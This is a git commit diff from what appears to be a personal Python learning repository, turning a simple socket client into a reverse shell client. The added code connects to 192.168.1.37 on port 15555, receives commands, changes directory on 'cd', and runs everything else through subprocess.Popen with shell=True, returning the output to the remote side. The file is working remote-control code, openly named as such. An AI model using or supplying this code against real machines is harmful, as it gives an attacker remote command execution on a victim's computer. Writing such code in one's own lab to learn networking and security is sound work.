9ddec88f7eec2dc9f3520f784ebfcf5acf611594
mehmet yel <mehmetyasinyel@hotmail.com>
2021-05-20 17:18:13 +0300

    python_learn35

--- projes/078_Reverse_Shell_Client.py
+++ projes/078_Reverse_Shell_Client.py
@@ -1,11 +1,34 @@
 import socket
+import os
+import subprocess
 
 s=socket.socket()
 
 s.connect(("192.168.1.37",15555))
 
-print(s.recv(4096).decode("utf-8"))
+while True:
+    veri=s.recv(1024)
 
-s.send("Mesaj alındı...".encode("utf-8"))
+    if veri[:2].decode("utf-8") =="cd":
 
-s.close()
+        try:
+            os.chdir(veri[3:].decode("utf-8"))
+            s.send(os.getcwd().encode("utf-8"))
+
+        except FileNotFoundError:
+
+            s.send("Dosya Bulunamadı...".encode("utf-8"))
+
+    else:
+        if len(veri)>0:
+
+            cmd=subprocess.Popen(veri.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+
+            output=cmd.stdout.read()+cmd.stderr.read()
+
+            output_str=str(output,encoding="cp857")
+
+            konum=os.getcwd()
+
+            s.send(str.encode(output_str+"\n"+konum,encoding="utf-8"))
+
